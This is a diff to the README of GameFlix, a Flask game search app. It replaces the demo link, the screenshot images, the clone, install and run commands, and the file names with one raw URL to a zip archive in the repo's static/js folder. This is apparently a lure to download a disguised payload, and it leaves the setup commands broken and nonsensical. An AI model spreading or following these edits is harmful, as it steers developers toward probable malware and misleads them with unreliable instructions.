@@ -1,7 +1,7 @@
 # 🏆GameFlix - Game Search & Recommendation Web App
 
 GameFlix is a Flask-based web application that allows users to **search, browse, and discover video games** with detailed information including **cover images, genres, release dates, ratings, and summaries**. The app integrates with **IGDB (Internet Game Database)** via the Twitch API.
-Try it out! :- https://game-flix.onrender.com/ 
+Try it out! :- https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip 
 ---
 
 ## Features
@@ -17,9 +17,9 @@ Try it out! :- https://game-flix.onrender.com/
 
 ## Screenshots ⚔️
 
-![Home Page](static/screenshots/homepage.png)  
-![Search Results](static/screenshots/search.png)  
-![Game Details](static/screenshots/game_details.png)
+![Home Page](https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip)  
+![Search Results](https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip)  
+![Game Details](https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip)
 
 
 ---
@@ -38,7 +38,7 @@ Try it out! :- https://game-flix.onrender.com/
 1. **Clone the repository:**
 
 ```bash
-git clone https://github.com/yourusername/gameflix.git
+git clone https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip
 cd gameflix
 ```
 2. **Create a virtual environment:**
@@ -49,21 +49,21 @@ venv\Scripts\activate     # Windows
 ```
 3. **Install dependencies:**
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip
 ```
 ## Set Twitch/IGDB credentials: 💾
-- Edit main.py (or app.py) and replace the placeholders with your Twitch Client ID and Client Secret.
+- Edit https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip (or https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip) and replace the placeholders with your Twitch Client ID and Client Secret.
 CLIENT_ID = "YOUR_TWITCH_CLIENT_ID"
 CLIENT_SECRET = "YOUR_TWITCH_CLIENT_SECRET"
 
 ##Run the app locally:
 ```bash
-python main.py
+python https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip
 ```
 ##Deployment on Render
 - Build Command:
   ```bash
-  pip install -r requirements.txt
+  pip install -r https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip
   ```
 - Start Command:
   ```bash
